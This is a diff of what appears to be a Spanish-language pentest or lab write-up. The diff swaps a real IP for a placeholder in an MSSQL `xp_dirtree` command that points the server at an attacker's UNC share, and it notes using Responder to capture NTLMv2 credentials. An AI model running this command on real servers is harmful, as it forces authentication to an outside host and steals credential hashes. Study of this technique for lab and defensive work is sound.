@@ -39,7 +39,7 @@ https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microso
 Después de intentar varias cosas que vienen en la documentación ponemos
 
 ~~~
-exec master.dbo.xp_dirtree '\\10.10.14.168\any\thing'
+exec master.dbo.xp_dirtree '\\{Mi IP}\any\thing'
 ~~~
 
 Seteamos con responder algo que consiga las credenciales NTLMv2
